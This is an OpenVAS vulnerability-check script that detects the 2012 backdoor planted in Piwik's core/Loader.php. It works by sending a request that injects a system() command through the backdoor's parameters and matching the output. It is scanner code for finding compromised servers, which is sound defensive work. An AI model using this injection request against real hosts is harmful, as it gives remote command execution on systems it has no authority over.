###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_piwik_backdoor_11_12.nasl 12216 2018-11-05 15:10:03Z mmartin $
#
# Backdoor in Piwik analytics software
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:piwik:piwik";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103611");
  script_version("$Revision: 12216 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Backdoor in Piwik analytics software");
  script_xref(name:"URL", value:"http://piwik.org/blog/2012/11/security-report-piwik-org-webserver-hacked-for-a-few-hours-on-2012-nov-26th/");
  script_xref(name:"URL", value:"http://forum.piwik.org/read.php?2,97666");

  script_tag(name:"last_modification", value:"$Date: 2018-11-05 16:10:03 +0100 (Mon, 05 Nov 2018) $");
  script_tag(name:"creation_date", value:"2012-11-27 13:36:59 +0100 (Tue, 27 Nov 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("sw_piwik_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("piwik/installed");

  script_tag(name:"solution", value:"See the References.");
  script_tag(name:"insight", value:"The Backdoor is in 'core/Loader.php' and create also the files:

 lic.log
 core/DataTable/Filter/Megre.php");
  script_tag(name:"summary", value:"A backdoor has been added to the web server analytics Piwik which
 allows attackers to take control of a system.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if (dir == "/") dir = "";

cmds = exploit_commands();

foreach cmd (keys(cmds)) {

  url = dir + "/core/Loader.php?s=1&g=system('" + cmds[cmd]  + "')";

  if(http_vuln_check(port:port, url:url, pattern:cmd)) {

    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
   }
}

exit(99);
